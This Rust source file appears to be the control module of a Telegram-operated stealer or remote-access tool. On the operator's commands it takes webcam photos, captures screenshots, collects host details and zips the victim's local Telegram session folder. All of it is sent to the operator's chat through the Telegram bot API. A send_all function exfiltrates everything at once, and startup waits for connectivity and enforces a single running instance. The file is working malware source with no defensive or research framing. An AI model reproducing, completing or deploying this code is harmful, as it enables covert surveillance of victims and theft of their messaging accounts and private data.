use std::{fs, time::Duration};
use teloxide::{macros::BotCommands, prelude::*, types::InputFile};
use info::*;
use tokio::time::sleep;
use utils::check_one_current_process;

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase")]
enum Command {
    Photo,
    Who,
    Screenshot,
    Telegram
}

async fn answer(bot: Bot, _msg: Message, cmd: Command) -> ResponseResult<()> {
    let cfg = config::Config::init();
    match cmd {
        Command::Photo => {
            match camera::create_photo(&cfg.camera_path){
                Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.camera_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            };
        }
        Command::Who => {
            match who().await {
                Ok(data) => {let _ = bot.send_message(cfg.chat_id.clone(), data).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            };
        }
        Command::Screenshot => {
            match system::capture_screen(&cfg.screenshot_path) {
                Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.screenshot_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            }
        }
        Command::Telegram => {
            match scrapper::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path, &cfg.local_path){
                Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            }
        }
    };

    Ok(())
}



pub async fn start() {
    check_one_current_process();
    while !utils::check_connection() {sleep(Duration::from_secs(3)).await}
    let cfg = config::Config::init();
    let _ = fs::create_dir(&cfg.my_dir);
    let bot = Bot::new(&cfg.bot_token);
    let _ = bot.send_message(cfg.chat_id, connected()).await;
    Command::repl(bot, answer).await;
}

pub async fn send_all(bot: &Bot){
    check_one_current_process();
    let cfg = config::Config::init();
    tokio::join!(
        async{match who().await {
                Ok(data) => {let _ = bot.send_message(cfg.chat_id.clone(), data).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }},
        async {match system::capture_screen(&cfg.screenshot_path) {
            Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.screenshot_path)).await;}
            Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }},
        async {match camera::create_photo(&cfg.camera_path){
            Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.camera_path)).await;}
            Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }},
        async { match scrapper::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path, &cfg.local_path){
            Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
            Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }}
    );
}


